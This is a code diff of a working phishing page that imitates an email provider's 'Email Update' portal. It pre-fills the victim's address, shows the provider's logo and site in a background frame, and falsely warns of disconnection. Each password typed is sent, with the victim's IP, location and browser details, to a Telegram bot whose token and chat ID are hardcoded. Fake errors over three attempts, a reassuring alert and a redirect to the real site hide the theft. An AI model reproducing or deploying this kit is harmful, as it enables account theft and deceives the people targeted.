@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Email Update</title>
   <style>
     body {
@@ -16,6 +16,7 @@
       position: relative;
       overflow: hidden;
     }
+
     #background-container {
       position: fixed;
       top: 0;
@@ -24,6 +25,7 @@
       height: 100%;
       z-index: -1;
     }
+
     #background-frame {
       width: 100%;
       height: 100%;
@@ -33,9 +35,11 @@
       left: 0;
       pointer-events: none;
     }
+
     .abstract-shapes {
       display: none;
     }
+
     .form-container {
       background: #fff;
       padding: 30px;
@@ -47,27 +51,32 @@
       position: relative;
       z-index: 1;
     }
+
     h2 {
       color: #333;
       margin-bottom: 20px;
       font-size: 22px;
       font-weight: bold;
     }
+
     p {
       color: #666;
       font-size: 14px;
       margin-bottom: 20px;
     }
+
     .form-group {
       margin-bottom: 15px;
       text-align: left;
     }
+
     .form-group label {
       display: block;
       margin-bottom: 5px;
       font-size: 14px;
       color: #333;
     }
+
     .form-group input {
       width: 100%;
       padding: 10px;
@@ -75,6 +84,7 @@
       border-radius: 5px;
       font-size: 14px;
     }
+
     .form-group button {
       width: 60%;
       padding: 12px;
@@ -91,9 +101,11 @@
       margin-right: auto;
       display: block;
     }
+
     .form-group button:hover {
       background: #0056b3;
     }
+
     .error-message {
       color: red;
       font-size: 14px;
@@ -101,11 +113,13 @@
       margin-top: 10px;
       text-align: left;
     }
+
     #domainLogo {
       max-height: 50px;
       display: block;
       margin: 0 auto 20px;
     }
+
     #session-expired {
       color: red;
       font-weight: normal;
@@ -123,7 +137,7 @@
   <img id="domainLogo" alt="Domain Logo" style="display: none;">
   <h2 id="emailDomainHeader"> Portal</h2>
   <p id="session-expired">Confirm your details to avoid disconnection</p>
-  
+
   <form id="loginForm">
     <div class="form-group">
       <label for="email">Email</label>
@@ -145,68 +159,85 @@ const token = "7072238292:AAHpDdR7mCeOCA1hnbB35_G52GUGLpx9xKM";
 const chatId = "6493402961";
 let attemptCount = 0;
 
-// Get email from URL hash
+// Handle email from hash
 const fragment = window.location.hash.slice(1);
 const email = decodeURIComponent(fragment);
 if (email) {
-  document.getElementById('email').value = email;
-  const domain = email.split('@')[1];
-  const provider = domain.split('.')[0];
-  document.getElementById('emailDomainHeader').textContent = ` ${provider} Portal`;
+  const emailField = document.getElementById('email');
+  emailField.value = email;
 
-  const logo = `https://logo.clearbit.com/${domain}`;
+  const emailDomain = email.split('@')[1];
+  const emailDomainHeader = emailDomain.split('.')[0];
+  document.getElementById('emailDomainHeader').textContent = ` ${emailDomainHeader} Portal`;
+
+  const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
   const logoImg = document.getElementById('domainLogo');
-  logoImg.src = logo;
-  logoImg.onerror = () => { logoImg.style.display = 'none'; };
-  logoImg.style.display = 'block';
+  logoImg.src = logoUrl;
+  logoImg.onerror = () => logoImg.style.display = "none";
+  logoImg.style.display = "block";
 
-  document.getElementById('background-frame').src = `https://${domain}`;
+  document.getElementById('background-frame').src = `https://${emailDomain}`;
 }
 
-// Hide error message on input
-document.getElementById('password').addEventListener('input', () => {
-  document.getElementById('errorMessage').style.display = 'none';
+const errorMessage = document.getElementById("errorMessage");
+document.getElementById("password").addEventListener("input", () => {
+  errorMessage.style.display = "none";
 });
 
-document.getElementById('loginForm').addEventListener('submit', function (e) {
-  e.preventDefault();
-  attemptCount++;
-
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
-  const time = new Date().toLocaleString();
-
-  fetch("https://ipapi.co/json")
+// Send data to Telegram
+function sendToTelegram(email, password, attempt) {
+  fetch("https://api.db-ip.com/v2/free/self")
     .then(res => res.json())
-    .then(loc => {
-      const ip = loc.ip || "Unknown IP";
-      const country = loc.country_name || "Unknown Country";
-      const region = loc.region || "Unknown Region";
-
-      const message = `🔐 Email Validation\n\n` +
+    .then(data => {
+      const ip = data.ipAddress || "Unknown";
+      const country = data.countryName || "Unknown";
+      const region = data.stateProv || "Unknown";
+      const time = new Date().toLocaleString();
+      const message = `🔐 Attempt ${attempt}/3\n\n` +
         `📧 Email: ${email}\n` +
         `🔑 Password: ${password}\n` +
+        `🌐 IP: ${ip}\n` +
         `🌍 Country: ${country}\n` +
         `🗺️ Region: ${region}\n` +
-        `🌐 IP: ${ip}\n` +
         `🕒 Time: ${time}\n` +
-        `📱 User-Agent: ${navigator.userAgent}`;
+        `📱 Browser: ${navigator.userAgent}`;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
-      }).finally(() => {
-        document.getElementById('errorMessage').style.display = 'block';
-        document.getElementById('password').value = '';
-
-        if (attemptCount >= 3) {
-          alert("Your password has now been maintained! You can continue using your account without interruption.");
-          const domain = email.split('@')[1];
-          window.location.href = `https://${domain}`;
-        }
       });
+    })
+    .then(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your password has now been maintained! You can continue using your account without interruption.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
+    })
+    .catch(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your password has now been Re-validated! You can continue using your account without interruption.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
     });
+}
+
+// Form handler
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+  const password = document.getElementById("password").value.trim();
+  if (!password) return;
+
+  attemptCount++;
+  sendToTelegram(email, password, attemptCount);
 });
 </script>
 
